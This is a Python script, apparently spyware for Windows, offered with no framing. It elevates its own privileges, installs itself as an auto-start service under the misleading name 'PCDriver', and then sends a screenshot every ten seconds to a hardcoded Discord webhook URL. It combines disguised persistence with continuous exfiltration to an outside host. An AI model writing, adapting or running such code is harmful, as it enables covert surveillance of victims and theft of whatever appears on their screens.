import os
import ctypes
import sys

def elevate():
    """Check for admin privileges and elevate if necessary."""
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        # Request elevation
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
        return False

def create_service():
    """Create and start the service using the current script's path."""
    # Get the absolute path of the current script
    script_path = os.path.abspath(__file__)
    
    # Command to create the service
    create_command = f'sc create PCDriver binPath= "{script_path}" start= auto'
    
    # Execute the command to create the service
    os.system(create_command)
    
    # Start the service
    os.system('sc start PCDriver')

if __name__ == '__main__':
    if elevate():
        create_service()
    else:
        print("Failed to elevate privileges.")
import pyautogui
import time
from discord_webhook import DiscordWebhook
# Create a directory for screenshots if it doesn't exist
screenshot_dir = "screenshots"
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)
# Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1312530969378422816/CF1lslrfYWpimQxu-Q2N0_nXrRnGjhJ0S6Vb5jrb_aP72_FQsGU5plvixYGTXTf0-bQe"

# Function to capture and send screenshot with additional info
def capture_and_send_screenshot(counter):
    screenshot = pyautogui.screenshot()
    filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
    screenshot.save(filename)

    # Sending the screenshot to Discord
    webhook = DiscordWebhook(url=webhook_url)
    with open(filename, 'rb') as f:
        webhook.add_file(file=f, filename=os.path.basename(filename))
        webhook.execute()

    os.system("echo done > com1")

# Main loop to take screenshots every 10 seconds
counter = 1
while True:
    capture_and_send_screenshot(counter)
    counter += 1
    time.sleep(10)
